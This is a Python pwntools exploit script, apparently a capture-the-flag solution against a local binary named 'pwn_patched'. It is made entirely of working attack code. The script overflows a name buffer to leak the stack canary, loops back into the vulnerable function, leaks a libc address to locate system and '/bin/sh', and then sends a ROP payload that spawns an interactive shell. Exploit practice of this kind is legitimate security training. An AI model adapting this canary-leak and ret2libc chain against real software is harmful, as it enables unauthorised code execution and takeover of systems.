from pwn import *
context(arch='amd64', os='linux', log_level='debug')
filename = './pwn_patched'
libc = ELF('./libc.so.6')
p = process(filename)

p.recvuntil(b"Please enter your name >>\n")
p.send(b'a' * 328 + b'b') 
ret = 0x40101a
p.recvuntil(b"Your name: ")
leak_data = p.recvuntil(b"Please enter your content >>\n", drop=True)

canary_part = leak_data[329:329+7] 
canary = u64(b'\x00' + canary_part)
success(f"Canary: {hex(canary)}")

vuln_addr = 0x40123d 
payload_restart = b'a' * 264 
payload_restart += p64(canary)
payload_restart += p64(0xdeadbeef) 
payload_restart += p64(ret)
payload_restart += p64(vuln_addr)
p.send(payload_restart)

p.recvuntil(b"Please enter your name >>\n")
p.send(b'c' * 384)
p.recvuntil(b"Your name: ")
p.recvuntil(b'c' * 384)
leak_raw = p.recv(6)
leak_addr = u64(leak_raw.ljust(8, b'\x00'))
success(f"Leaked Stack Addr (Libc): {hex(leak_addr)}")

libc.address = leak_addr - 0x947d0
success(f"Leaked libc_base {hex(libc.address)}")
pop_rdi = libc.address + 0x000000000002a3e5
system_addr = libc.symbols['system']
success(f"Leaked system: {hex(system_addr)}")
pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret'])[0]
success(f"Leaked rdi: {hex(pop_rdi)}")
bin_sh = next(libc.search(b'/bin/sh'))
success(f"Leaked bin: {hex(bin_sh)}")

payload_shell = b'a' * 264
payload_shell += p64(canary)
payload_shell += p64(0)
payload_shell += p64(ret)
payload_shell += p64(pop_rdi)
payload_shell += p64(bin_sh)
payload_shell += p64(system_addr)

p.recvuntil(b"Please enter your content >>\n")

p.send(payload_shell)

p.interactive()